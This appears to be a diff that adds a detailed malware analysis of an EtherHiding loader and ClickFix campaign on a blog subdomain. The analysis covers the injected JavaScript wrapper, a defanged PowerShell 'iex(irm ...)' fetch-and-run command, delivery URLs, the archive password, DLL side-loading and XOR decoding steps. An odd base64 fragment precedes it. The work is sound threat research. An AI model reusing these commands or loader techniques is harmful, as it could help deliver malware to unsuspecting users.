@@ -39,3 +39,1297 @@
   script.async = true;
   (document.head || document.body).appendChild(script);
 })();
+
+rZJvnqaaQhLn/nmWT8cSUm+72VQ7inHLSLYO6/VHWA1ht7zsOBk52M97X0DGIbwKXSW1pK6O3uw"
+
+# EtherHiding to ClickFix on new-blog.artlist.io
+
+Last updated: 2026-07-13
+
+Status: working draft. The browser, JavaScript, PowerShell, and archive-delivery chain is reconstructed from static artifacts and controlled byte collection. The extracted Windows payload bundle has not been executed.
+
+## Executive summary
+
+`new-blog.artlist.io` was observed with an obfuscated script inserted at the top of the main HTML. The main `artlist.io` site was not observed compromised during this pass. The injected script decodes into an EtherHiding loader: it queries a Polygon smart contract, receives the next-stage host, and injects a script from `auth-code-check.info`.
+
+That next-stage script is a ClickFix payload. It presents a fake reCAPTCHA-style overlay, blocks common inspection shortcuts, copies a PowerShell command to the clipboard, and instructs the visitor to open Windows Terminal and paste it. If the user follows the instructions, the PowerShell chain eventually downloads a password-protected ZIP, extracts it with a staged copy of `7z.exe`, locates `fdupdate.exe`, starts it, and then calls a success marker.
+
+The important correction from replay is that delivery was not simply dead. The first archive fetch went `410 Gone` after the `/p/<token>` success marker was touched too early. A fresh replay that preserved the intended order delivered the 31 MB `fdupdate.zip` archive successfully.
+
+Static analysis of the recovered Windows bundle now points to a DLL-side execution chain rather than a simple standalone EXE. The delivered `fdupdate.exe` looks like a signed StruSoft/FEM-Design updater, but it loads a local DLL chain that reaches `LibBind.dll`. `LibBind.dll` starts a loader thread, reads an encrypted slice out of `Stream.Toolkit.dat`, XOR-decodes it, copies it into memory allocated by `TBFVSS_DLL_SRV_64.dll`, marks the region executable, and executes it through an `EnumTimeFormatsEx` callback. The decoded in-memory payload manually resolves APIs, contains VM-detection strings, AMSI/.NET strings, Run-key persistence strings, and file-extension targets such as `bak`, `db`, `bin`, `dat`, `raw`, and `pak`.
+
+The later branch is nested again. The `Stream.Toolkit.dat` shellcode finds and parses `Face.dat`, decodes a script/config record and an `act.exe` PE record, and the `act.exe` loader decrypts an embedded ZIP to raw x64 code. That raw x64 stage then XOR-decodes another embedded PE32+ DLL at raw offset `0xc48`, length `0x873c00`, using byte mask `0x43 ^ (i & 0xff)`, manually maps it, and calls its DLL entry point. That final decoded PE has real imports for networking, cryptography, certificate stores, UI/input capture, filesystem, registry, service, and compression APIs. Its full behavior is still under static analysis.
+
+Because the payload appeared at the top of the HTML across the subdomain, the likely insertion point is upstream of individual posts: a shared template, CMS/theme layer, plugin, tag manager, edge worker, CDN rule, or publishing pipeline. The primary site should still be checked separately, but current evidence points to `new-blog.artlist.io` as the affected surface.
+
+## Current checkpoint
+
+Checkpoint time: 2026-07-13 19:05 EDT. This document is the continuity source after context compaction.
+
+Current static-analysis pivot:
+
+```text
+raw x64 stage:
+  path: auth-code-check-analysis/act_inner_zip_extracted/act_embedded_blob_decrypted_aes256cbc_unpadded
+  sha256: 06157c24ed9ad3b2a639ca901deac6a29c26861ab5f6da31093247eadec9139a
+
+decoded embedded PE:
+  path: auth-code-check-analysis/raw_x64_decoded_pe_0xc48_0x873c00.bin
+  offset in raw x64 stage: 0xc48
+  encoded length: 0x873c00
+  decode: byte[i] ^= 0x43 ^ (i & 0xff)
+  sha256: 8035b177ca682962fd6501228ebd460ef174183ac08a87d81514bba3ecfd9502
+```
+
+Completed side work: sidecar `deep_worker` statically confirmed the raw x64 artifact is a position-independent reflective loader. It self-locates, resolves `kernel32.dll` APIs through a PEB walk and CRC-32-like export hashing, XOR-decodes the concealed PE at `0xc48`, manually maps it in-process, registers unwind metadata, runs TLS callbacks, and invokes the decoded image as `DllMain(module_base, DLL_PROCESS_ATTACH, NULL)`. A `fast_scan` side agent confirmed the doc gap for the inner PE decode and recommended adding the offset/length/formula/artifact explicitly; that gap is now closed here.
+
+Completed side work: sidecar `deep_worker` mapped the decoded PE DLL entry/export behavior and several high-impact capability functions. Main-thread spot checks confirmed the keylogger, clipboard, screen/video capture, TCP socket, service-install, hidden-window, and remote-process-memory evidence before merging it into this document.
+
+## High-level chain
+
+```text
+new-blog.artlist.io HTML
+  -> top-of-page obfuscated JavaScript
+  -> base64 decode, XOR 0x50, TextDecoder, new Function
+  -> EtherHiding loader
+  -> Polygon RPC call to contract 0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2
+  -> contract returns hxxps://auth-code-check[.]info
+  -> injected script hxxps://auth-code-check[.]info/api.php?s=<campaign>&_v=<minute>
+  -> fake reCAPTCHA / ClickFix UI
+  -> clipboard PowerShell command
+  -> hxxps://auth-code-check[.]info/<ray>
+  -> hxxp://auth-code-check[.]info/<ray>?_=1
+  -> 20 second wait
+  -> hxxp://auth-code-check[.]info/7z
+  -> hxxp://auth-code-check[.]info/<archive-token>
+  -> extract fdupdate.zip with password Arsen33
+  -> start fdupdate.exe
+  -> hxxp://auth-code-check[.]info/p/<archive-token> success marker from PowerShell
+  -> local DLL load chain reaches LibBind.dll
+  -> LibBind.dll reads Stream.Toolkit.dat at offset 0x4c26a
+  -> XOR 0xe5 decode of 0x533a3 bytes
+  -> TBFVSS_DLL_SRV_64.dll makes decoded region executable
+  -> EnumTimeFormatsEx callback executes decoded x64 payload
+  -> shellcode parses Face.dat and decodes script/config plus act.exe
+  -> act.exe decrypts embedded ZIP to raw x64 code
+  -> raw x64 code XOR-decodes and manually maps an embedded PE32+ DLL
+```
+
+## Stage 0: injected page script
+
+The injected script at the top of the `new-blog.artlist.io` HTML used a compact wrapper:
+
+```javascript
+var blob = atob("...");
+var key = 80;
+var bytes = new Uint8Array(blob.length);
+for (...) bytes[i] = blob.charCodeAt(i) ^ key;
+(new Function(new TextDecoder().decode(bytes)))();
+```
+
+The decoded script was an EtherHiding loader. The use of a smart contract here matters because the compromised web page does not need to contain the live payload host directly. It contains the contract lookup logic, and the operator can rotate the returned value on-chain.
+
+The decoded loader also sets a guard flag:
+
+```javascript
+if (window["_197515e445"]) return;
+window["_197515e445"] = 1;
+```
+
+This prevents duplicate execution on the same page.
+
+Observed campaign material:
+
+- Campaign token: `fd31a7ad950e56856e09dcb32f0fc58caec1ad7da5c91b0a`
+- Polygon contract: `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2`
+- Selector: `0xb68d1809`
+- Contract return: `hxxps://auth-code-check[.]info`
+
+Observed RPC endpoints embedded in the loader:
+
+- `hxxps://polygon.gateway.tenderly.co`
+- `hxxps://polygon.drpc.org`
+- `hxxps://rpc-mainnet.matic.quiknode.pro`
+- `hxxps://1rpc.io/matic`
+- `hxxps://polygon-public.nodies.app`
+- `hxxps://rpc.ankr.com/polygon`
+- `hxxps://polygon-bor-rpc.publicnode.com`
+- `hxxps://polygon-mainnet.public.blastapi.io`
+
+The final script URL is assembled as:
+
+```text
+hxxps://auth-code-check[.]info/api.php?s=fd31a7ad950e56856e09dcb32f0fc58caec1ad7da5c91b0a&_v=<floor(Date.now()/60000)>
+```
+
+The `_v` value changes once per minute and appears to act as a cache-buster.
+
+This is the key EtherHiding move. The compromised page does not hard-code the final delivery host. It hard-codes a contract, a method selector, and RPC failover infrastructure. Blocking a single delivery host may not be enough if the actor can rotate the returned URL through contract-controlled data.
+
+## Stage 1: ClickFix script from auth-code-check.info
+
+Two minute-versioned responses were decoded:
+
+| File | Size | SHA-256 |
+| --- | ---: | --- |
+| `api_v29732886.body` | 32,475 | `214fa76441986c6229a2aed4b79e830bd28ea1d625eae67b7862e12f63b6abc7` |
+| `api_v29732886.decoded.js` | 24,166 | `065cd95e592a6614937c0ef12af97caf0be4771a6685bd23ab0c2314e2af314c` |
+| `api_v29732897.body` | 32,475 | `0a0da35f0e635237101897d38069d3454b313376e5cf7ed3a48a6f7ee68e9c84` |
+| `api_v29732897.decoded.js` | 24,166 | `3ab4c70f6cea5b28a82cf3e95734d4dfc160879a5e7096ffd554ad41f3c8dbfc` |
+
+The wrapper changed XOR key between versions, but the decoded script structure stayed the same.
+
+The decoded JavaScript does the following:
+
+- Creates a full-page Shadow DOM overlay.
+- Mimics a reCAPTCHA checkbox and verification flow.
+- Localizes the fake prompt into multiple languages.
+- Displays keyboard instructions: `Windows + X`, `I` or Terminal, `Ctrl + V`, `Enter`.
+- Blocks context menu and common inspection shortcuts such as F12, Ctrl+Shift+I/J/C, and Ctrl+U.
+- Uses a per-campaign/per-host localStorage key to avoid repeated display.
+- Generates a visitor ID with `crypto.randomUUID()` or random bytes.
+- Sends telemetry to `api.php`, preferring AES-GCM-encrypted JSON and falling back to query parameters.
+- Posts `action=dl`, `action=cb`, and `action=check` events to `api.php`.
+- Copies a PowerShell command into the clipboard.
+
+The old decoded ray was:
+
+```text
+0a733c55b124993d
+```
+
+The fresh replay ray was:
+
+```text
+0492b50f7725358c
+```
+
+Defanged clipboard command from the fresh decoded script:
+
+```powershell
+powershell -w h "iex(irm 'auth-code-check[.]info/0492b50f7725358c' -UseBasicParsing)"; exit <#Verification ID: 0492b50f7725358c#>
+```
+
+The `-w h` flag hides the PowerShell window. The `irm` call fetches the next stage and pipes it into `iex`.
+
+## Stage 2: first PowerShell wrapper
+
+The fresh initial URL was:
+
+```text
+hxxps://auth-code-check[.]info/0492b50f7725358c
+```
+
+Its body was XOR-obfuscated PowerShell:
+
+| File | SHA-256 |
+| --- | --- |
+| `fresh_initial_https.body` | `88eb150b2872ca6f10329746ccd4c7cac3ace128a1548e30c6f2f04c5176ae7c` |
+| `fresh_initial_https.decoded.ps1` | `eda80dae2f732875eb0d7205430e2a6e299868b90fa2d119c65e6075ee3a5b70` |
+
+The decoded wrapper constructs the URL with an XOR array, creates a `WinHttp.WinHttpRequest.5.1` COM object, fetches the next stage, converts the response bytes to text, and executes the resulting script block.
+
+Decoded next-stage URL:
+
+```text
+hxxp://auth-code-check[.]info/0492b50f7725358c?_=1
+```
+
+The older ray followed the same pattern:
+
+```text
+hxxps://auth-code-check[.]info/0a733c55b124993d
+hxxp://auth-code-check[.]info/0a733c55b124993d?_=1
+```
+
+## Stage 3: second PowerShell wrapper and payload downloader
+
+The fresh second-stage body:
+
+| File | SHA-256 |
+| --- | --- |
+| `fresh_second_http.body` | `cd1bc28537fe461fbe0262d895c918d60c3df1bdc4c1a950aa3527099d137a90` |
+| `fresh_final_stage.decoded.ps1` | `1743c97ff662e0739a194c8e25277223b7afc90f3d8dbe67f7e558506ef82eb7` |
+| `fresh_final_stage_inner.decoded.ps1` | `379b75a41cba293ae096fd127ba7e8fe77557ac116bd9683e28d41e3664bd455` |
+
+The inner script is the main downloader. Static behavior:
+
+- Sleeps for 20 seconds.
+- Decodes archive password from base64: `QXJzZW4zMw==` -> `Arsen33`.
+- Creates a random temp directory.
+- Downloads `7z.exe`.
+- Downloads a ZIP archive.
+- Extracts the ZIP with `7z x -y -pArsen33 -o<random-dir>`.
+- Recursively finds `fdupdate.exe`.
+- Starts `fdupdate.exe`.
+- Deletes the archive.
+- Calls a `/p/<archive-token>` URL after launch.
+
+Fresh decoded URLs:
+
+```text
+hxxp://auth-code-check[.]info/7z
+hxxp://auth-code-check[.]info/f6b98f07c7f130cb8f60967e8ebd7a7203f228bc6faafce6fb1d88166ca27a7d
+hxxp://auth-code-check[.]info/p/f6b98f07c7f130cb8f60967e8ebd7a7203f228bc6faafce6fb1d88166ca27a7d
+```
+
+Older decoded archive token:
+
+```text
+hxxp://auth-code-check[.]info/fb4c750e92503f9beb289468286ca55214eb27461052811572122517ea01619c
+hxxp://auth-code-check[.]info/p/fb4c750e92503f9beb289468286ca55214eb27461052811572122517ea01619c
+```
+
+## Why the first archive went missing
+
+The first replay returned `410 Gone` for the archive path. At first glance that looked like the backend had stopped delivering. The later fresh replay suggests a better explanation: the chain has consumption logic.
+
+In the inner PowerShell, `/p/<archive-token>` is not a prerequisite for archive delivery. It is called after `Start-Process fdupdate.exe`, which makes it a likely success marker. During the first archive attempt, that marker was touched before the archive was fetched. After that, the archive endpoint returned empty `410 Gone` responses. The API check endpoint also later reported consumed/fetched state.
+
+The timestamp sequence supports that conclusion: the `/p/<old-token>` request returned at `20:11:03`, and the archive request returned `410 Gone` at `20:11:04`. That ordering is backwards compared with the decoded PowerShell, which only calls `/p/` after extraction and launch.
+
+There were also request-shape quirks. A PowerShell-like User-Agent caused the initial route to return 404, while default curl fetched the real first-stage wrapper. The copied command also omits the URL scheme in `irm 'auth-code-check.info/<ray>'`, while the first wrapper pivots to an explicit `http://...?...` URL. For replay, the working path was to follow the server shape that returned bytes, preserve the browser-side `action=dl` and `action=cb` sequence, wait, fetch `/7z`, then fetch the archive without touching `/p/`.
+
+With a fresh ray and the intended order:
+
+```text
+action=dl -> action=cb -> hxxps://auth-code-check[.]info/<ray> -> hxxp://auth-code-check[.]info/<ray>?_=1 -> wait -> /7z -> archive
+```
+
+and without touching `/p/<archive-token>`, the archive delivered successfully.
+
+This means the campaign was still live during the fresh replay, and delivery can be missed if replay does not preserve the backend state machine.
+
+## Payload package recovered
+
+Fresh archive response:
+
+```text
+HTTP/1.1 200 OK
+Content-Type: application/zip
+Content-Length: 32713067
+Content-Disposition: attachment; filename*=UTF-8''fdupdate.zip
+Cache-Control: no-store, no-cache, must-revalidate
+```
+
+Recovered files:
+
+| Artifact | Size | SHA-256 |
+| --- | ---: | --- |
+| `fresh_tool_7z.bin` | 858,112 | `26817725650583d99ca3e617a618dd75c0f71bd316b5761780b7361f5f824cad` |
+| `fresh_payload_archive.bin` | 32,713,067 | `3a9b8eccad62d84fc59f86dae41e8c74ae6ae544f079b099b12b37de1abd7a60` |
+
+The `7z.exe` helper appears to be a stock 7-Zip standalone console binary. The archive extracts to a `fdupdate/` directory with 27 files and about 79 MB uncompressed content.
+
+Important extracted files:
+
+| File | Size | SHA-256 |
+| --- | ---: | --- |
+| `fdupdate.exe` | 573,768 | `d518964aa67c359d0a806909451130591e337276bea33b6d41ef79126904ca3a` |
+| `fdcadkernel.dll` | 9,897,288 | `0c080d3b70beb766f522d0b48855ce5642665b9c77a5c1abb1f4530244e61d2d` |
+| `fdunderkernel.dll` | 466,240 | `82193ac9cb7a933b421f9fa99d874e242285ab6f06d50b3cd81684f4f939c1b3` |
+| `LibBind.dll` | 45,056 | `2f592365de553d8bb023a9e11439c2e18dcbe84d22b0cd6025b043d7d9029ac7` |
+| `MUITransferX64.dll` | 31,232 | `a30c6a042e65c8a94fdb08ffbc8c8328adaea929b5ab932ece91be53fbc19ec8` |
+| `TBFVSS_DLL_SRV_64.dll` | 28,160 | `a7c94343b51643b7477ba2c7630b168ce3cb1f03126a85c39363e70742e3afb5` |
+| `uv.dll` | 307,421 | `4424e5bd722c8c2bf65f3b74bc5355cde908e927af16157e3718587f1bffbca9` |
+
+## Initial binary triage
+
+`fdupdate.exe` is a PE32+ x64 Windows GUI executable:
+
+- Size: 573,768 bytes
+- SHA-256: `d518964aa67c359d0a806909451130591e337276bea33b6d41ef79126904ca3a`
+- Compiled: 2026-02-17 13:18:34
+- Signed: true
+- PDB path: `D:\autobuild_install_server\ver_main_M_Commercial\projectclone\temp\Release64\fdupdate.pdb`
+- Imports `WININET.dll`: `InternetOpenUrlW`, `InternetOpenW`, `InternetReadFile`, `InternetSetOptionW`, `InternetGetConnectedState`
+- Imports many functions from local `fdcadkernel.dll`
+
+The `fdupdate.exe` WININET routine at `0x1400204e0` decompiles like a normal updater path: it uses a mutex string `StruSoft/FEM-Design -> check for update is running`, reads `fdupd.ini` and `version.ini`, and references release-note/update fields. Current static evidence does not put the malicious behavior in `fdupdate.exe` itself. The stronger finding is that the signed EXE is the launch point for a local DLL chain that reaches malicious loader code in unsigned DLLs.
+
+Unsigned DLLs that stand out:
+
+| File | Compiled | Signed | Notable exports |
+| --- | --- | --- | --- |
+| `LibBind.dll` | 2026-05-19 23:16:43 | false | `ApplyGaussianBlurGDI`, `EnumerateMonitorRegions`, `RenderTiltedDropShadowText`, `SetupLoopbackAudioCapture`, `group_by_u` |
+| `MUITransferX64.dll` | 2026-05-19 23:16:39 | false | `BuildRoundedRectGeometry`, `ComposeLayeredGdiplusImage`, `ExtractMetafilePlaceableHeader`, `FromSplit`, `QueryDeviceVolumeLevels` |
+| `TBFVSS_DLL_SRV_64.dll` | 2026-05-19 23:16:36 | false | `CreateThumbnailFromShellItem`, `FillPolygonWithHatch`, `GenerateSmoothStepCurve`, `NormalizeAudioPeaks`, `OptimizeAfter`, `Ux`, `data_process` |
+
+`fdcadkernel.dll` has a large import surface that includes URL and network-adjacent APIs such as `URLDownloadToCacheFileW`, `IsValidURL`, `PathIsURLW`, `WSAStartup`, crypto APIs from `ADVAPI32.dll`, registry APIs, and `ShellExecuteW`.
+
+`fdunderkernel.dll` exports clipboard and calculator-related helpers such as `TextToClipboardW`, `MemToClipboard`, `CS2StartCalculator`, `CS2RunCalculator`, and imports `CreateProcessW`, clipboard APIs, and `SetWindowsHookExW`.
+
+Those imports do not prove malicious behavior by themselves, but they are the right places for the next static reverse-engineering pass.
+
+## Payload bundle static analysis
+
+This pass used `rbinr2` for PE metadata, imports, xrefs, disassembly, and decompiler checks; `rbinghidra` for Ghidra imports/decompilation; and `rbindeob` against carved blobs. No extracted binary, script, shellcode, macro, or payload was executed.
+
+### DLL load graph
+
+Observed static load/import relationships from import tables:
+
+```text
+fdupdate.exe
+  -> fdcadkernel.dll
+       -> renderengine.dll
+       -> fdunderkernel.dll
+       -> clicsys.dll
+
+renderengine.dll
+  -> LibBind.dll
+
+LibBind.dll
+  -> TBFVSS_DLL_SRV_64.dll
+  -> uv.dll
+  -> LoadLibraryW("MUITransferX64.dll")
+
+MUITransferX64.dll
+  -> TBFVSS_DLL_SRV_64.dll
+```
+
+`renderengine.dll` references `LibBind.dll::group_by_u` from a graphics/rendering path at `0x18003b3c5`. A second reference at `0x180075dc6` is an import thunk. More importantly, `LibBind.dll` also starts its own loader thread from process attach, so loading `LibBind.dll` is sufficient to reach the hidden payload path; the renderer call is an additional trigger, not a prerequisite.
+
+The direct import path is now confirmed statically: `fdupdate.exe` imports `fdcadkernel.dll`, `fdcadkernel.dll` imports `renderengine.dll`, and `renderengine.dll` imports `LibBind.dll`. `LibBind.dll` in turn imports `TBFVSS_DLL_SRV_64.dll` and `uv.dll`, and uses `LoadLibraryW` for `MUITransferX64.dll`.
+
+### LibBind.dll loader
+
+`LibBind.dll` is the key bridge from the application bundle into the hidden payload.
+
+Static control flow:
+
+- `LibBind.dll` entry point at `0x1800059cc` handles process attach.
+- Helper at `0x180001328` stores the module handle and calls `CreateThread`.
+- The thread start at `0x180001a64` calls `LibBind.dll::group_by_u`.
+- `group_by_u` at `0x1800017e0` is guarded by a one-time global flag.
+- It builds the local path to `MUITransferX64.dll` and loads it with `LoadLibraryW`.
+- It builds the local path to `Stream.Toolkit.dat`.
+- It reads `Stream.Toolkit.dat` from offset `0x4c26a` for up to `0x533a3` bytes.
+- It calls `TBFVSS_DLL_SRV_64.dll::data_process(4)` to get a destination inside a larger allocation.
+- It waits up to `0xe678` ms, zeroes the destination buffer, XOR-decodes the file slice, copies it into the allocated memory, and calls `TBFVSS_DLL_SRV_64.dll::Ux(decoded_ptr, 0x20)`.
+- It exits the worker thread.
+
+The XOR routine at `0x180001310` decodes exactly `0x533a3` bytes with key `0xe5`.
+
+### TBFVSS_DLL_SRV_64.dll execution primitive
+
+`TBFVSS_DLL_SRV_64.dll` supplies the memory allocation and callback execution pieces.
+
+`data_process` at `0x180001220`:
+
+- Collects basic system/path/time context with APIs such as `GetSystemInfo`, `GetSystemDirectoryW`, `GetWindowsDirectoryW`, `GetTempPathW`, `GetTickCount`, `GetSystemTime`, `GetLocalTime`, `GetModuleHandleW`, and `GetModuleFileNameW`.
+- Calls `VirtualAlloc(NULL, 0x208000, 0x3000, protection)`.
+- Stores the base pointer in a global.
+- Fills the allocation with `BCryptGenRandom(..., 0x208000, 2)`.
+- Returns an offset pointer inside that allocation. `LibBind.dll` copies the decoded payload there.
+
+`Ux` at `0x18000137c`:
+
+- Uses a short libuv timer setup.
+- Calls `VirtualProtect(global_alloc_base, 0x208000, 0x20, &oldProtect)`, making the region `PAGE_EXECUTE_READ`.
+- Calls `EnumTimeFormatsEx(callback=decoded_payload_ptr, ...)`.
+- Retries with locale name `!x-sys-default-locale` if the first callback registration fails.
+
+This is a callback-based shellcode execution primitive. The decoded data is not loaded as a PE file; it is raw x64 code called through a Windows enumeration callback.
+
+`OptimizeAfter` at `0x180001198` enumerates top-level windows for a target process ID and calls `ShowWindow(hwnd, 0)` on matching visible windows. `MUITransferX64.dll::FromSplit` calls this export twice, at `0x180001275` and `0x18000128d`, so `MUITransferX64.dll` appears to provide window-hiding support for the bundle.
+
+### Stream.Toolkit.dat payload carve
+
+The loader reads and decodes an embedded slice from `Stream.Toolkit.dat`.
+
+| Artifact | Size | SHA-256 |
+| --- | ---: | --- |
+| `Stream.Toolkit.dat` | 896,616 | `6bc18b6c6050bdd554c4a945838b8b3a35b5c5813b950cf5f2e822b2396718cf` |
+| Carved bytes, offset `0x4c26a`, length `0x533a3` | 340,899 | `037b67b3a1495968e3511b0c487be2b3d8f073449d058795ab15f2eed13694e0` |
+| XOR `0xe5` decoded bytes | 340,899 | `a0812fec1c5051121c332d6add4f2b05df43e3190ceebfef29ca56d62ceca48d` |
+
+The decoded blob is raw x64 code, not a normal PE. Its first instructions are:
+
+```asm
+0x10000000  sub rsp, 0x28
+0x10000004  xor ecx, ecx
+0x10000006  call 0x10052841
+0x1000000b  nop
+0x1000000c  add rsp, 0x28
+0x10000010  ret
+```
+
+Ghidra imported the decoded blob with `BinaryLoader` at base `0x10000000` and found 1,043 candidate functions. No normal string table was found. Strings are built on the stack and decoded through a helper that uses seed `0x7ba56675fa291565` and the LCG:
+
+```text
+seed = seed * 0x19660d + 0x3c6ef35f
+decoded_utf16 = encoded_word ^ (((seed & 0xffff) * 2 + 0x11) & 0xffff)
+```
+
+The entry target at `0x10052841` initializes context, calls `0x10052a81`, and if that returns null builds the decoded status string:
+
+```text
+[-] Not Found Storage !
+```
+
+The storage-finder routine at `0x10052a81` begins by enumerating modules in the current process:
+
+- `0x10052ad2` calls the `GetCurrentProcessId` wrapper.
+- `0x10052ae7` calls the `CreateToolhelp32Snapshot` wrapper with flag `0x8`.
+- `0x10052b26` and `0x10052bc8` call the `Module32FirstW` and `Module32NextW` wrappers.
+- It prepares a `0x438`-byte stack object at `0x10052af1`-`0x10052b01`, stores `0x438` as the first dword at `0x10052b06`, then passes that object to the module enumeration wrappers. On x64 this matches `MODULEENTRY32W`: `dwSize == 0x438`, `szModule` at `+0x30`, and `szExePath` at `+0x230`.
+- At `0x10052b3a`, it passes the stack field corresponding to `MODULEENTRY32W.szExePath` into string helper `0x1004e1a1`, normalizes/copies it through helpers including `0x10040361` and `0x1004ee71`, and stores accepted module paths into a 0x30-stride list through `0x1001386d`/`0x100091c5`.
+
+It uses those module executable paths as seeds for later candidate file checks. This is broader than simply swapping a module filename extension. The path builder `0x1003d7c5` calls `0x1003d81d`, which appends a wildcard to the seed path, calls `FindFirstFileW` (`0x10044645`), iterates with `FindNextFileW` (`0x1004473d`), closes the handle with `FindClose` (`0x100447bd`), skips `.`/`..`, and can recurse into subdirectories when its recursion flag is set. Candidate entries are filtered through descriptor helper `0x1003db45`/`0x1003e21d` before being appended to the output list.
+
+For each stored module-path entry, the finder builds a small extension descriptor set from stack-decoded UTF-16 strings:
+
+- `0x10052cd8`: words `2ab9 8f70 29a4 b975` decode to `bak\x00`
+- `0x10052d69`: words `2abf 8f73 29cf` decode to `db\x00`
+- `0x10052e01`: words `2ab9 8f78 29a1 b975` decode to `bin\x00`
+- `0x10052e92`: words `2abf 8f70 29bb b975` decode to `dat\x00`
+- `0x10052f23`: words `2aa9 8f70 29b8 b975` decode to `raw\x00`
+- `0x10052fb4`: words `2aab 8f70 29a4 b975` decode to `pak\x00`
+
+The extension descriptor set is combined with the module-path seed through `0x1003d7c5` into a candidate list at stack object `var_1a8h`. The routine then iterates that candidate list: `0x1002063d` selects a candidate, `0x1004e265` converts it into a path/string object, `0x10039375` initializes a byte buffer, and `0x1003b1f9` reads the candidate file into that buffer. At `0x1005310e`-`0x10053129`, the call convention is `RCX = parser context`, `RDX = candidate buffer pointer`, `R8 = candidate length`, and `R9D = 0x1b51b9fd`, then the routine calls parser/validator `0x1004d65d`.
+
+Static disassembly of `0x1004d65d` shows a structured storage-format check rather than a simple CRC/hash comparison. The storage-search caller uses `0x1004d65d`, which sets the copy/own-buffer flag and then calls the shared parser `0x1004d699`. A sibling wrapper at `0x1004d605` instead derives the total storage size through `0x1004d509` and calls the same parser without copying the backing buffer.
+
+`0x1004d699` receives a candidate byte pointer and length, requires at least `0x38` bytes, stores the caller-supplied `0x1b51b9fd` at parser-context offset `+0x20`, records the backing pointer at `+0x28`, records size bounds at `+0x30`/`+0x38`, and calls internal table decoders at `0x1004bb6d`, `0x1004bc45`, and `0x1004bc91`. These helpers do not just read fields; they subtract arithmetic expressions involving the magic/key at context `+0x20`. The parser then checks the first decoded header word against the parser-context word at `+0x1e` and validates that `record_count * 0x58 + 0x78` stays inside the backing size.
+
+The storage records begin at backing offset `0x78` and use a `0x58` stride. `0x1004d509` decodes the record-count table at `+0x50`, walks each `0x58`-byte record, calls `0x1004b27d`, and returns `record_count * 0x58 + 0x78 + decoded_payload_size_sum`. `0x1004b27d` decodes ten qword fields per record into offset/length-style values, booleans, and byte attributes, again using the magic/key and the record index in the arithmetic. This supports the current hypothesis that the shellcode searches for a custom packed storage/database file, though the exact target application or data format still needs more static work.
+
+Static replay of the validator over the extracted payload directory identifies `Face.dat` as the storage file the decoded payload is built to find. This replay only reads local bytes and applies the arithmetic recovered from `0x1004d699`/`0x1004b27d`; it does not execute the payload. Under magic/key `0x1b51b9fd`, `Face.dat` passes the decoded header check with `record_count = 1178`, table bound `0x19568`, and decoded total size `0x7a3b2e`, matching the file size. `Stream.Toolkit.dat` fails the same header/table checks.
+
+The decoded `Face.dat` table has 1,178 records. The record table starts at `0x78`, the payload area starts at `0x19568`, and decoded record payload lengths sum exactly to the end of the file. The first decoded field is a logical record ID (`1..1178` in table order), the second behaves like a parent/reference field, the third is a type/tag in the `16000+` range, and the fourth is payload length. Most records have 0- or 8-byte payloads. Two records carry almost all payload data:
+
+- record ID `4`, parent/reference `2`, tag `16001`, length `3990`, payload offset `0x19568`
+- record ID `1168`, parent/reference `1164`, tag `16100`, length `7896064`, payload offset `0x1be5e`
+
+Sidecar static analysis confirmed the decoded record metadata layout. For raw qwords `q0..q10` at `base + 0x78 + table_index * 0x58`, using key `K = 0x1b51b9fd`, `0x1004b27d` derives:
+
+```text
+decoded +0x00: id        = q1 - K*q0 - q0
+decoded +0x08: parent    = q2 - K + 3*q0
+decoded +0x10: tag       = q3 - K*(q0 + 5) + 2*q0
+decoded +0x18: length    = q4 - K - 7*q0
+decoded +0x20: write transform flag
+decoded +0x21: write transform key
+decoded +0x22: read transform flag = (q7 - 3*K + 3*q0) != 0
+decoded +0x23: read transform key  = low8(q8 - K*q0 + 4*q0)
+decoded +0x24: trailing flag, not consumed on the observed read path
+decoded +0x25: trailing key, not consumed on the observed read path
+```
+
+All 1,178 records in this `Face.dat` have the read-transform flag set. The trailing flag/key pair is false/zero in this sample. Payload offsets are implicit in table order; no per-record payload offset field is stored.
+
+The payload accessor path is now statically mapped. `0x1004c189` returns the storage payload base as `backing_ptr + record_count * 0x58 + 0x78`. `0x1004c25d` looks up a record by logical ID, copies `0x26` bytes of decoded metadata to the caller, and returns the payload pointer as `payload_base + cumulative_length_of_previous_records`. The common read wrapper `0x1004c78d` calls `0x1004c25d`, then `0x1004c391` allocates/copies the payload bytes into the caller's buffer. If metadata byte `+0x22` is set, `0x1004c391` calls `0x1004b88d` -> `0x1004b73d` with metadata byte `+0x23` as the transform parameter.
+
+The `0x1004b73d` transform is a reversible XOR stream, not a heavyweight cipher:
+
+```text
+param = metadata_byte_0x23
+if 6 < param < 0x28:
+    param = (param * 4 + 0x18) & 0xff
+
+state = 6
+for each payload byte:
+    state = (state * 3 + 5) & 0xff
+    byte ^= (param + state) & 0xff
+```
+
+There is a second one-byte state in the routine that is updated and conditionally reset, but static disassembly shows it is not used in the byte written back to the payload buffer.
+
+Replaying that transform over local `Face.dat` bytes, without executing the payload, produced two important decoded artifacts:
+
+- record ID `4`, tag `16001`, xform key `0xa1`: UTF-16 script/config, SHA-256 `629518befad5153a2e8352e30f6a5169bac2c17329497678d5686cf15a0aacc9`
+- record ID `1168`, tag `16100`, xform key `0x4f`: PE32+ x64 GUI executable, SHA-256 `75d4b6cec5bdc40cda25b5b9be136ccca97d77843825796beace7ddbfe87b614`
+
+The decoded record `4` script starts with:
+
+```text
+complex $shtmon;
+
+task preparations[active=true,async=false]
+{
+    delayer::delay_in_seconds(2);
+}
+```
+
+It defines active tasks for a two-second preparation delay, shutdown-triggered autorun repair, repeated HKCU Run persistence every 125 seconds, repeated scheduled-task persistence every 675 seconds, loading `@input` through `previewer::load_exe`, and then blocking forever with `delayer::delay_infinite()`.
+
+Key script behaviors:
+
+- `runtime::resource_get_id(@input)` followed by `runtime::resource_get_bytes($resid)` and `previewer::load_exe($exe_bytes)`
+- `process::get_itself_path()`
+- `autoruns::autorun_exists_hkcu()` and `autoruns::autorun_add_hkcu()`
+- `autoruns::shtasks_exists()` and `autoruns::shtasks_add()`
+- `shutdown_monitor::create_instance()` and `shutdown_monitor::start(..., autorunAddOnShutdown)`
+
+The `@input` resource group is visible in the decoded record tree:
+
+- parent record `1164`, tag `16050`
+- record `1165`, tag `16051`, selector `0x1ebbae8f5810b65b`
+- record `1166`, tag `16052`, UTF-16 payload `input`
+- record `1167`, tag `16053`, scalar `0x426c`
+- record `1168`, tag `16100`, decoded PE payload
+
